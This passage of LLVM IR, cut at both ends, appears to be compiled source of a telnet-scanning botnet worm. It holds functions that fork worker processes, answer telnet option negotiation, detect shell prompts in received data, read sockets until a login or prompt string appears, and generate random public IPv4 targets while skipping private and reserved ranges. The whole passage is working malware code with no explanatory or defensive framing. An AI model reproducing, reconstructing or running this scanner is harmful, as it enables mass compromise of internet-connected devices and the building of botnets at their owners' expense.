  %45 = add nsw i32 %0, 1
  %46 = call i32 @select(i32 %45, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %6, %struct.__sigset_t* null, %struct.timeval* nonnull %7) #3
  %47 = icmp sgt i32 %46, 0
  br i1 %47, label %48, label %58

; <label>:48:                                     ; preds = %31
  store i32 4, i32* %8, align 4
  %49 = bitcast i32* %9 to i8*
  %50 = call i32 @getsockopt(i32 %0, i32 1, i32 4, i8* nonnull %49, i32* nonnull %8) #3
  %51 = load i32, i32* %9, align 4
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %53, label %58

; <label>:53:                                     ; preds = %48, %21
  %54 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #3
  %55 = sext i32 %54 to i64
  %56 = and i64 %55, -2049
  %57 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %56) #3
  br label %58

; <label>:58:                                     ; preds = %27, %31, %48, %4, %53
  %.0 = phi i32 [ 1, %53 ], [ 0, %4 ], [ 0, %48 ], [ 0, %31 ], [ 0, %27 ]
  ret i32 %.0
}

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #9

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() local_unnamed_addr #1 {
  %1 = tail call i32 @fork() #3
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %21, label %3

; <label>:3:                                      ; preds = %0
  %4 = load i64, i64* @numpids, align 8
  %5 = add i64 %4, 1
  store i64 %5, i64* @numpids, align 8
  %6 = shl i64 %4, 2
  %7 = add i64 %6, 8
  %8 = tail call noalias i8* @malloc(i64 %7) #3
  %9 = bitcast i8* %8 to i32*
  %10 = icmp eq i64 %4, 0
  br i1 %10, label %.._crit_edge_crit_edge, label %.lr.ph.preheader

.._crit_edge_crit_edge:                           ; preds = %3
  %.pre14 = load i8*, i8** bitcast (i32** @pids to i8**), align 8
  br label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  %.pre = load i32*, i32** @pids, align 8
  %11 = bitcast i32* %.pre to i8*
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %12 = phi i64 [ %17, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.012 = phi i32 [ %16, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %13 = getelementptr inbounds i32, i32* %.pre, i64 %12
  %14 = load i32, i32* %13, align 4
  %15 = getelementptr inbounds i32, i32* %9, i64 %12
  store i32 %14, i32* %15, align 4
  %16 = add i32 %.012, 1
  %17 = zext i32 %16 to i64
  %18 = icmp ult i64 %17, %4
  br i1 %18, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.._crit_edge_crit_edge
  %19 = phi i8* [ %.pre14, %.._crit_edge_crit_edge ], [ %11, %._crit_edge.loopexit ]
  %.lcssa = phi i64 [ 0, %.._crit_edge_crit_edge ], [ %4, %._crit_edge.loopexit ]
  %20 = getelementptr inbounds i32, i32* %9, i64 %.lcssa
  store i32 %1, i32* %20, align 4
  tail call void @free(i8* %19) #3
  store i8* %8, i8** bitcast (i32** @pids to i8**), align 8
  br label %21

; <label>:21:                                     ; preds = %0, %._crit_edge
  ret i32 %1
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) local_unnamed_addr #1 {
  %4 = alloca i8, align 1
  %5 = getelementptr inbounds i8, i8* %1, i64 1
  %6 = load i8, i8* %5, align 1
  %.off = add i8 %6, 5
  %switch = icmp ult i8 %.off, 4
  br i1 %switch, label %7, label %20

; <label>:7:                                      ; preds = %3
  store i8 -1, i8* %4, align 1
  %8 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #3
  %9 = load i8, i8* %5, align 1
  switch i8 %9, label %13 [
    i8 -4, label %10
    i8 -2, label %11
    i8 3, label %12
  ]

; <label>:10:                                     ; preds = %7
  store i8 -2, i8* %4, align 1
  br label %16

; <label>:11:                                     ; preds = %7
  store i8 -4, i8* %4, align 1
  br label %16

; <label>:12:                                     ; preds = %7
  store i8 -3, i8* %4, align 1
  br label %16

; <label>:13:                                     ; preds = %7
  %14 = icmp eq i8 %9, -3
  %15 = select i1 %14, i8 -4, i8 -2
  store i8 %15, i8* %4, align 1
  br label %16

; <label>:16:                                     ; preds = %11, %13, %12, %10
  %17 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #3
  %18 = getelementptr inbounds i8, i8* %1, i64 2
  %19 = call i64 @send(i32 %0, i8* %18, i64 1, i32 16384) #3
  br label %20

; <label>:20:                                     ; preds = %3, %16
  ret i32 0
}

; Function Attrs: noinline nounwind readonly uwtable
define i32 @matchPrompt(i8* nocapture readonly) local_unnamed_addr #11 {
.preheader:
  %1 = tail call i64 @strlen(i8* %0) #15
  %2 = trunc i64 %1 to i32
  %sext = shl i64 %1, 32
  %3 = ashr exact i64 %sext, 32
  %4 = getelementptr inbounds i8, i8* %0, i64 %3
  %sext41 = shl i64 %1, 32
  %5 = ashr exact i64 %sext41, 32
  %6 = icmp sgt i32 %2, 0
  br i1 %6, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.preheader.137:                                   ; preds = %.critedge
  %7 = icmp sgt i32 %2, %.1.lcssa
  br i1 %7, label %.lr.ph.1.preheader, label %.critedge.1

.lr.ph.1.preheader:                               ; preds = %.preheader.137
  br label %.lr.ph.1

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.critedge1
  %indvars.iv = phi i64 [ %indvars.iv.next, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %.130 = phi i32 [ %12, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %8 = sub nsw i64 0, %indvars.iv
  %9 = getelementptr inbounds i8, i8* %4, i64 %8
  %10 = load i8, i8* %9, align 1
  %11 = trunc i64 %indvars.iv to i32
  switch i8 %10, label %.critedge.loopexit [
    i8 0, label %.critedge1
    i8 32, label %.critedge1
    i8 13, label %.critedge1
    i8 10, label %.critedge1
  ]

.critedge1:                                       ; preds = %.lr.ph, %.lr.ph, %.lr.ph, %.lr.ph
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %12 = add nsw i32 %.130, 1
  %13 = icmp sgt i64 %5, %indvars.iv.next
  br i1 %13, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %.critedge1
  %.1.lcssa.ph = phi i32 [ %11, %.lr.ph ], [ %12, %.critedge1 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.1.lcssa = phi i32 [ 0, %.preheader ], [ %.1.lcssa.ph, %.critedge.loopexit ]
  %14 = sext i32 %.1.lcssa to i64
  %15 = sub nsw i64 0, %14
  %16 = getelementptr inbounds i8, i8* %4, i64 %15
  %17 = load i8, i8* %16, align 1
  %18 = icmp eq i8 %17, 58
  br i1 %18, label %19, label %.preheader.137

; <label>:19:                                     ; preds = %.critedge.3, %.critedge.2, %.critedge.1, %.critedge
  ret i32 1

.lr.ph.1:                                         ; preds = %.lr.ph.1.preheader, %.critedge1.1
  %indvars.iv.1 = phi i64 [ %indvars.iv.next.1, %.critedge1.1 ], [ %14, %.lr.ph.1.preheader ]
  %.130.1 = phi i32 [ %24, %.critedge1.1 ], [ %.1.lcssa, %.lr.ph.1.preheader ]
  %20 = sub nsw i64 0, %indvars.iv.1
  %21 = getelementptr inbounds i8, i8* %4, i64 %20
  %22 = load i8, i8* %21, align 1
  %23 = trunc i64 %indvars.iv.1 to i32
  switch i8 %22, label %.critedge.1.loopexit [
    i8 0, label %.critedge1.1
    i8 32, label %.critedge1.1
    i8 13, label %.critedge1.1
    i8 10, label %.critedge1.1
  ]

.critedge1.1:                                     ; preds = %.lr.ph.1, %.lr.ph.1, %.lr.ph.1, %.lr.ph.1
  %indvars.iv.next.1 = add nsw i64 %indvars.iv.1, 1
  %24 = add nsw i32 %.130.1, 1
  %25 = icmp sgt i64 %5, %indvars.iv.next.1
  br i1 %25, label %.lr.ph.1, label %.critedge.1.loopexit

.critedge.1.loopexit:                             ; preds = %.critedge1.1, %.lr.ph.1
  %.1.lcssa.1.ph = phi i32 [ %23, %.lr.ph.1 ], [ %24, %.critedge1.1 ]
  br label %.critedge.1

.critedge.1:                                      ; preds = %.critedge.1.loopexit, %.preheader.137
  %.1.lcssa.1 = phi i32 [ %.1.lcssa, %.preheader.137 ], [ %.1.lcssa.1.ph, %.critedge.1.loopexit ]
  %26 = sext i32 %.1.lcssa.1 to i64
  %27 = sub nsw i64 0, %26
  %28 = getelementptr inbounds i8, i8* %4, i64 %27
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 62
  br i1 %30, label %19, label %.preheader.238

.preheader.238:                                   ; preds = %.critedge.1
  %31 = icmp sgt i32 %2, %.1.lcssa.1
  br i1 %31, label %.lr.ph.2.preheader, label %.critedge.2

.lr.ph.2.preheader:                               ; preds = %.preheader.238
  br label %.lr.ph.2

.lr.ph.2:                                         ; preds = %.lr.ph.2.preheader, %.critedge1.2
  %indvars.iv.2 = phi i64 [ %indvars.iv.next.2, %.critedge1.2 ], [ %26, %.lr.ph.2.preheader ]
  %.130.2 = phi i32 [ %36, %.critedge1.2 ], [ %.1.lcssa.1, %.lr.ph.2.preheader ]
  %32 = sub nsw i64 0, %indvars.iv.2
  %33 = getelementptr inbounds i8, i8* %4, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = trunc i64 %indvars.iv.2 to i32
  switch i8 %34, label %.critedge.2.loopexit [
    i8 0, label %.critedge1.2
    i8 32, label %.critedge1.2
    i8 13, label %.critedge1.2
    i8 10, label %.critedge1.2
  ]

.critedge1.2:                                     ; preds = %.lr.ph.2, %.lr.ph.2, %.lr.ph.2, %.lr.ph.2
  %indvars.iv.next.2 = add nsw i64 %indvars.iv.2, 1
  %36 = add nsw i32 %.130.2, 1
  %37 = icmp sgt i64 %5, %indvars.iv.next.2
  br i1 %37, label %.lr.ph.2, label %.critedge.2.loopexit

.critedge.2.loopexit:                             ; preds = %.critedge1.2, %.lr.ph.2
  %.1.lcssa.2.ph = phi i32 [ %35, %.lr.ph.2 ], [ %36, %.critedge1.2 ]
  br label %.critedge.2

.critedge.2:                                      ; preds = %.critedge.2.loopexit, %.preheader.238
  %.1.lcssa.2 = phi i32 [ %.1.lcssa.1, %.preheader.238 ], [ %.1.lcssa.2.ph, %.critedge.2.loopexit ]
  %38 = sext i32 %.1.lcssa.2 to i64
  %39 = sub nsw i64 0, %38
  %40 = getelementptr inbounds i8, i8* %4, i64 %39
  %41 = load i8, i8* %40, align 1
  %42 = icmp eq i8 %41, 37
  br i1 %42, label %19, label %.preheader.339

.preheader.339:                                   ; preds = %.critedge.2
  %43 = icmp sgt i32 %2, %.1.lcssa.2
  br i1 %43, label %.lr.ph.3.preheader, label %.critedge.3

.lr.ph.3.preheader:                               ; preds = %.preheader.339
  br label %.lr.ph.3

.lr.ph.3:                                         ; preds = %.lr.ph.3.preheader, %.critedge1.3
  %indvars.iv.3 = phi i64 [ %indvars.iv.next.3, %.critedge1.3 ], [ %38, %.lr.ph.3.preheader ]
  %.130.3 = phi i32 [ %48, %.critedge1.3 ], [ %.1.lcssa.2, %.lr.ph.3.preheader ]
  %44 = sub nsw i64 0, %indvars.iv.3
  %45 = getelementptr inbounds i8, i8* %4, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = trunc i64 %indvars.iv.3 to i32
  switch i8 %46, label %.critedge.3.loopexit [
    i8 0, label %.critedge1.3
    i8 32, label %.critedge1.3
    i8 13, label %.critedge1.3
    i8 10, label %.critedge1.3
  ]

.critedge1.3:                                     ; preds = %.lr.ph.3, %.lr.ph.3, %.lr.ph.3, %.lr.ph.3
  %indvars.iv.next.3 = add nsw i64 %indvars.iv.3, 1
  %48 = add nsw i32 %.130.3, 1
  %49 = icmp sgt i64 %5, %indvars.iv.next.3
  br i1 %49, label %.lr.ph.3, label %.critedge.3.loopexit

.critedge.3.loopexit:                             ; preds = %.critedge1.3, %.lr.ph.3
  %.1.lcssa.3.ph = phi i32 [ %47, %.lr.ph.3 ], [ %48, %.critedge1.3 ]
  br label %.critedge.3

.critedge.3:                                      ; preds = %.critedge.3.loopexit, %.preheader.339
  %.1.lcssa.3 = phi i32 [ %.1.lcssa.2, %.preheader.339 ], [ %.1.lcssa.3.ph, %.critedge.3.loopexit ]
  %50 = sext i32 %.1.lcssa.3 to i64
  %51 = sub nsw i64 0, %50
  %52 = getelementptr inbounds i8, i8* %4, i64 %51
  %53 = load i8, i8* %52, align 1
  %54 = icmp eq i8 %53, 36
  br i1 %54, label %19, label %.preheader.440

.preheader.440:                                   ; preds = %.critedge.3
  %55 = icmp sgt i32 %2, %.1.lcssa.3
  br i1 %55, label %.lr.ph.4.preheader, label %.critedge.4

.lr.ph.4.preheader:                               ; preds = %.preheader.440
  br label %.lr.ph.4

.lr.ph.4:                                         ; preds = %.lr.ph.4.preheader, %.critedge1.4
  %indvars.iv.4 = phi i64 [ %indvars.iv.next.4, %.critedge1.4 ], [ %50, %.lr.ph.4.preheader ]
  %.130.4 = phi i32 [ %60, %.critedge1.4 ], [ %.1.lcssa.3, %.lr.ph.4.preheader ]
  %56 = sub nsw i64 0, %indvars.iv.4
  %57 = getelementptr inbounds i8, i8* %4, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = trunc i64 %indvars.iv.4 to i32
  switch i8 %58, label %.critedge.4.loopexit [
    i8 0, label %.critedge1.4
    i8 32, label %.critedge1.4
    i8 13, label %.critedge1.4
    i8 10, label %.critedge1.4
  ]

.critedge1.4:                                     ; preds = %.lr.ph.4, %.lr.ph.4, %.lr.ph.4, %.lr.ph.4
  %indvars.iv.next.4 = add nsw i64 %indvars.iv.4, 1
  %60 = add nsw i32 %.130.4, 1
  %61 = icmp sgt i64 %5, %indvars.iv.next.4
  br i1 %61, label %.lr.ph.4, label %.critedge.4.loopexit

.critedge.4.loopexit:                             ; preds = %.critedge1.4, %.lr.ph.4
  %.1.lcssa.4.ph = phi i32 [ %59, %.lr.ph.4 ], [ %60, %.critedge1.4 ]
  br label %.critedge.4

.critedge.4:                                      ; preds = %.critedge.4.loopexit, %.preheader.440
  %.1.lcssa.4 = phi i32 [ %.1.lcssa.3, %.preheader.440 ], [ %.1.lcssa.4.ph, %.critedge.4.loopexit ]
  %62 = sext i32 %.1.lcssa.4 to i64
  %63 = sub nsw i64 0, %62
  %64 = getelementptr inbounds i8, i8* %4, i64 %63
  %65 = load i8, i8* %64, align 1
  %66 = icmp eq i8 %65, 35
  %. = zext i1 %66 to i32
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8* nocapture readonly, i32, i32, i32, i8*, i32, i32) local_unnamed_addr #1 {
  %9 = alloca %struct.__sigset_t, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = sext i32 %3 to i64
  %12 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i64 0, i32 0
  store i64 %11, i64* %12, align 8
  %13 = sext i32 %4 to i64
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i64 0, i32 1
  store i64 %13, i64* %14, align 8
  %15 = add nsw i32 %7, 2
  %16 = icmp slt i32 %15, %6
  br i1 %16, label %.lr.ph, label %.critedge

.lr.ph:                                           ; preds = %8
  %17 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i64 0, i32 0, i64 0
  %18 = srem i32 %0, 64
  %19 = zext i32 %18 to i64
  %20 = shl i64 1, %19
  %21 = sdiv i32 %0, 64
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i64 0, i32 0, i64 %22
  %24 = add nsw i32 %0, 1
  %25 = icmp eq i32 %2, 0
  %26 = icmp sgt i32 %3, 0
  %27 = icmp sgt i32 %4, 0
  %28 = or i1 %26, %27
  br i1 %25, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br i1 %28, label %.lr.ph77.preheader, label %.critedge

.lr.ph77.preheader:                               ; preds = %.lr.ph.split.preheader
  br label %.lr.ph77

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br i1 %28, label %.lr.ph67.preheader, label %.critedge

.lr.ph67.preheader:                               ; preds = %.lr.ph.split.us.preheader
  br label %.lr.ph67

.lr.ph67:                                         ; preds = %.lr.ph67.preheader, %.backedge.us..lr.ph.split.us_crit_edge
  %.03335.us66 = phi i32 [ %40, %.backedge.us..lr.ph.split.us_crit_edge ], [ %7, %.lr.ph67.preheader ]
  %29 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %17) #3, !srcloc !15
  %30 = load i64, i64* %23, align 8
  %31 = or i64 %30, %20
  store i64 %31, i64* %23, align 8
  %32 = call i32 @select(i32 %24, %struct.__sigset_t* nonnull %9, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* nonnull %10) #3
  %33 = icmp slt i32 %32, 1
  br i1 %33, label %.critedge.loopexit, label %34

; <label>:34:                                     ; preds = %.lr.ph67
  %35 = sext i32 %.03335.us66 to i64
  %36 = getelementptr inbounds i8, i8* %5, i64 %35
  %37 = call i64 @recv(i32 %0, i8* %36, i64 1, i32 0) #3
  %38 = trunc i64 %37 to i32
  switch i32 %38, label %39 [
    i32 -1, label %.critedge.loopexit
    i32 0, label %.critedge.loopexit
  ]

; <label>:39:                                     ; preds = %34
  %40 = add nsw i32 %38, %.03335.us66
  %41 = load i8, i8* %36, align 1
  %42 = icmp eq i8 %41, -1
  br i1 %42, label %.us-lcssa.us.loopexit, label %43

; <label>:43:                                     ; preds = %39
  %44 = call i8* @strstr(i8* nonnull %5, i8* %1) #15
  %45 = icmp eq i8* %44, null
  br i1 %45, label %.backedge.us, label %.critedge.loopexit

.backedge.us:                                     ; preds = %43
  %46 = add nsw i32 %40, 2
  %47 = icmp slt i32 %46, %6
  br i1 %47, label %.backedge.us..lr.ph.split.us_crit_edge, label %.critedge.loopexit

.backedge.us..lr.ph.split.us_crit_edge:           ; preds = %.backedge.us
  %.pre54 = load i64, i64* %12, align 8
  %.pre55 = load i64, i64* %14, align 8
  %48 = icmp sgt i64 %.pre54, 0
  %49 = icmp sgt i64 %.pre55, 0
  %50 = or i1 %48, %49
  br i1 %50, label %.lr.ph67, label %.critedge.loopexit

.lr.ph77:                                         ; preds = %.lr.ph77.preheader, %.backedge..lr.ph.split_crit_edge
  %.0333576 = phi i32 [ %62, %.backedge..lr.ph.split_crit_edge ], [ %7, %.lr.ph77.preheader ]
  %51 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %17) #3, !srcloc !15
  %52 = load i64, i64* %23, align 8
  %53 = or i64 %52, %20
  store i64 %53, i64* %23, align 8
  %54 = call i32 @select(i32 %24, %struct.__sigset_t* nonnull %9, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* nonnull %10) #3
  %55 = icmp slt i32 %54, 1
  br i1 %55, label %.critedge.loopexit89, label %56

; <label>:56:                                     ; preds = %.lr.ph77
  %57 = sext i32 %.0333576 to i64
  %58 = getelementptr inbounds i8, i8* %5, i64 %57
  %59 = call i64 @recv(i32 %0, i8* %58, i64 1, i32 0) #3
  %60 = trunc i64 %59 to i32
  switch i32 %60, label %61 [
    i32 -1, label %.critedge.loopexit89
    i32 0, label %.critedge.loopexit89
  ]

; <label>:61:                                     ; preds = %56
  %62 = add nsw i32 %60, %.0333576
  %63 = load i8, i8* %58, align 1
  %64 = icmp eq i8 %63, -1
  br i1 %64, label %.us-lcssa.us.loopexit91, label %70

.us-lcssa.us.loopexit:                            ; preds = %39
  br label %.us-lcssa.us

.us-lcssa.us.loopexit91:                          ; preds = %61
  br label %.us-lcssa.us

.us-lcssa.us:                                     ; preds = %.us-lcssa.us.loopexit91, %.us-lcssa.us.loopexit
  %.lcssa = phi i8* [ %36, %.us-lcssa.us.loopexit ], [ %58, %.us-lcssa.us.loopexit91 ]
  %65 = getelementptr inbounds i8, i8* %.lcssa, i64 1
  %66 = call i64 @recv(i32 %0, i8* %65, i64 2, i32 0) #3
  %67 = trunc i64 %66 to i32
  switch i32 %67, label %68 [
    i32 -1, label %.critedge
    i32 0, label %.critedge
  ]

; <label>:68:                                     ; preds = %.us-lcssa.us
  %69 = call i32 @negotiate(i32 %0, i8* nonnull %.lcssa, i32 undef)
  br label %.critedge

; <label>:70:                                     ; preds = %61
  %71 = call i8* @strstr(i8* nonnull %5, i8* %1) #15
  %72 = icmp eq i8* %71, null
  br i1 %72, label %78, label %.critedge.loopexit89

.backedge:                                        ; preds = %78
  %73 = add nsw i32 %62, 2
  %74 = icmp slt i32 %73, %6
  br i1 %74, label %.backedge..lr.ph.split_crit_edge, label %.critedge.loopexit89

.backedge..lr.ph.split_crit_edge:                 ; preds = %.backedge
  %.pre = load i64, i64* %12, align 8
  %.pre53 = load i64, i64* %14, align 8
  %75 = icmp sgt i64 %.pre, 0
  %76 = icmp sgt i64 %.pre53, 0
  %77 = or i1 %75, %76
  br i1 %77, label %.lr.ph77, label %.critedge.loopexit89

; <label>:78:                                     ; preds = %70
  %79 = call i32 @matchPrompt(i8* nonnull %5)
  %80 = icmp eq i32 %79, 0
  br i1 %80, label %.backedge, label %.critedge.loopexit89

.critedge.loopexit:                               ; preds = %34, %34, %43, %.lr.ph67, %.backedge.us..lr.ph.split.us_crit_edge, %.backedge.us
  %.0.ph = phi i32 [ 0, %34 ], [ 0, %34 ], [ 1, %43 ], [ 0, %.lr.ph67 ], [ 0, %.backedge.us..lr.ph.split.us_crit_edge ], [ 0, %.backedge.us ]
  br label %.critedge

.critedge.loopexit89:                             ; preds = %56, %56, %70, %78, %.lr.ph77, %.backedge..lr.ph.split_crit_edge, %.backedge
  %.0.ph90 = phi i32 [ 0, %56 ], [ 0, %56 ], [ 1, %70 ], [ 1, %78 ], [ 0, %.lr.ph77 ], [ 0, %.backedge..lr.ph.split_crit_edge ], [ 0, %.backedge ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit89, %.critedge.loopexit, %.lr.ph.split.preheader, %.lr.ph.split.us.preheader, %8, %.us-lcssa.us, %.us-lcssa.us, %68
  %.0 = phi i32 [ 0, %68 ], [ 0, %.us-lcssa.us ], [ 0, %.us-lcssa.us ], [ 0, %8 ], [ 0, %.lr.ph.split.us.preheader ], [ 0, %.lr.ph.split.preheader ], [ %.0.ph, %.critedge.loopexit ], [ %.0.ph90, %.critedge.loopexit89 ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() local_unnamed_addr #1 {
  %1 = alloca [16 x i8], align 16
  %2 = alloca [16 x i8], align 16
  %3 = load i8, i8* @ipState.1, align 1
  %4 = icmp eq i8 %3, 0
  br i1 %4, label %.critedge.preheader, label %5

; <label>:5:                                      ; preds = %0
  %6 = load i8, i8* @ipState.4, align 1
  %7 = icmp eq i8 %6, -1
  br i1 %7, label %.critedge.preheader, label %8

.critedge.preheader:                              ; preds = %0, %5
  br label %.critedge

; <label>:8:                                      ; preds = %5
  %9 = add i8 %6, 1
  store i8 %9, i8* @ipState.4, align 1
  %10 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %10, i8 0, i64 16, i32 16, i1 false)
  %11 = zext i8 %3 to i32
  %12 = load i8, i8* @ipState.2, align 1
  %13 = zext i8 %12 to i32
  %14 = load i8, i8* @ipState.3, align 1
  %15 = zext i8 %14 to i32
  %16 = zext i8 %9 to i32
  %17 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %10, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.46, i64 0, i64 0), i32 %11, i32 %13, i32 %15, i32 %16)
  br label %143

.critedge:                                        ; preds = %.critedge.backedge, %.critedge.preheader
  %18 = tail call i32 @rand() #3
  %19 = srem i32 %18, 255
  %20 = trunc i32 %19 to i8
  store i8 %20, i8* @ipState.0, align 1
  %21 = tail call i32 @rand() #3
  %22 = srem i32 %21, 255
  %23 = trunc i32 %22 to i8
  store i8 %23, i8* @ipState.1, align 1
  %24 = tail call i32 @rand() #3
  %25 = srem i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* @ipState.2, align 1
  %27 = tail call i32 @rand() #3
  %28 = srem i32 %27, 255
  %29 = trunc i32 %28 to i8
  store i8 %29, i8* @ipState.3, align 1
  %30 = load i8, i8* @ipState.0, align 1
  switch i8 %30, label %thread-pre-split [
    i8 0, label %.critedge.backedge
    i8 10, label %.critedge.backedge
    i8 100, label %31
    i8 127, label %.critedge.backedge
    i8 -87, label %35
  ]

.critedge.backedge:                               ; preds = %.critedge, %.critedge, %.critedge, %35, %31, %thread-pre-split, %42, %47, %58, %61, %64, %69, %74, %78, %82, %86, %91, %94, %98, %103, %105, %107, %111, %113, %119, %123, %127, %134, %55
  br label %.critedge

; <label>:31:                                     ; preds = %.critedge
  %32 = load i8, i8* @ipState.1, align 1
  %33 = icmp ugt i8 %32, 63
  %34 = icmp sgt i8 %32, -1
  %or.cond = and i1 %33, %34
  br i1 %or.cond, label %.critedge.backedge, label %thread-pre-split.thread228

thread-pre-split.thread228:                       ; preds = %31
  %.pre229 = load i8, i8* @ipState.1, align 1
  br label %.thread231

; <label>:35:                                     ; preds = %.critedge
  %36 = load i8, i8* @ipState.1, align 1
  %37 = icmp eq i8 %36, -2
  br i1 %37, label %.critedge.backedge, label %.thread231

thread-pre-split:                                 ; preds = %.critedge
  %.pre = load i8, i8* @ipState.1, align 1
  %38 = icmp eq i8 %30, -84
  %39 = icmp ult i8 %.pre, 17
  %or.cond50 = and i1 %38, %39
  br i1 %or.cond50, label %.critedge.backedge, label %42

.thread231:                                       ; preds = %thread-pre-split.thread228, %35
  %.ph = phi i8 [ %.pre229, %thread-pre-split.thread228 ], [ %36, %35 ]
  %40 = icmp eq i8 %.ph, 0
  %41 = load i8, i8* @ipState.2, align 1
  br label %47

; <label>:42:                                     ; preds = %thread-pre-split
  %43 = icmp eq i8 %30, -64
  %44 = icmp eq i8 %.pre, 0
  %or.cond52 = and i1 %43, %44
  %45 = load i8, i8* @ipState.2, align 1
  %46 = icmp eq i8 %45, 2
  %or.cond54 = and i1 %or.cond52, %46
  br i1 %or.cond54, label %.critedge.backedge, label %47

; <label>:47:                                     ; preds = %.thread231, %42
  %48 = phi i8 [ %41, %.thread231 ], [ %45, %42 ]
  %49 = phi i1 [ %40, %.thread231 ], [ %44, %42 ]
  %50 = phi i1 [ false, %.thread231 ], [ %43, %42 ]
  %51 = phi i8 [ %.ph, %.thread231 ], [ %.pre, %42 ]
  %52 = icmp eq i8 %51, 88
  %or.cond56 = and i1 %50, %52
  %53 = icmp eq i8 %48, 99
  %or.cond58 = and i1 %or.cond56, %53
  %54 = icmp eq i8 %51, -88
  %or.cond60 = and i1 %50, %54
  %or.cond197 = or i1 %or.cond60, %or.cond58
  br i1 %or.cond197, label %.critedge.backedge, label %55

; <label>:55:                                     ; preds = %47
  %56 = icmp eq i8 %30, -58
  %57 = and i8 %51, -2
  %switch = icmp eq i8 %57, 18
  %or.cond198 = and i1 %56, %switch
  br i1 %or.cond198, label %.critedge.backedge, label %58

; <label>:58:                                     ; preds = %55
  %59 = icmp eq i8 %51, 51
  %or.cond62 = and i1 %56, %59
  %60 = icmp eq i8 %48, 100
  %or.cond64 = and i1 %or.cond62, %60
  br i1 %or.cond64, label %.critedge.backedge, label %61

; <label>:61:                                     ; preds = %58
  %62 = icmp eq i8 %30, -53
  %or.cond66 = and i1 %62, %49
  %63 = icmp eq i8 %48, 113
  %or.cond68 = and i1 %or.cond66, %63
  br i1 %or.cond68, label %.critedge.backedge, label %64

; <label>:64:                                     ; preds = %61
  %65 = icmp eq i8 %30, -68
  %66 = icmp eq i8 %51, -47
  %or.cond70 = and i1 %65, %66
  %67 = icmp eq i8 %48, 52
  %68 = icmp eq i8 %48, 49
  %or.cond76213 = or i1 %67, %68
  %or.cond199 = and i1 %or.cond70, %or.cond76213
  br i1 %or.cond199, label %.critedge.backedge, label %69

; <label>:69:                                     ; preds = %64
  %70 = icmp eq i8 %30, -71
  %71 = icmp eq i8 %51, 62
  %or.cond78 = and i1 %70, %71
  %.off = add i8 %48, 67
  %72 = icmp ult i8 %.off, 2
  %73 = icmp eq i8 %48, -68
  %or.cond88215 = or i1 %73, %72
  %or.cond201 = and i1 %or.cond78, %or.cond88215
  br i1 %or.cond201, label %.critedge.backedge, label %74

; <label>:74:                                     ; preds = %69
  %75 = icmp eq i8 %51, 61
  %or.cond90 = and i1 %70, %75
  %76 = or i8 %48, 1
  %77 = icmp eq i8 %76, -119
  %or.cond202 = and i1 %or.cond90, %77
  br i1 %or.cond202, label %.critedge.backedge, label %78

; <label>:78:                                     ; preds = %74
  %79 = icmp eq i8 %51, 11
  %or.cond98 = and i1 %70, %79
  %80 = icmp eq i8 %76, -109
  %81 = icmp eq i8 %48, -111
  %or.cond108218 = or i1 %81, %80
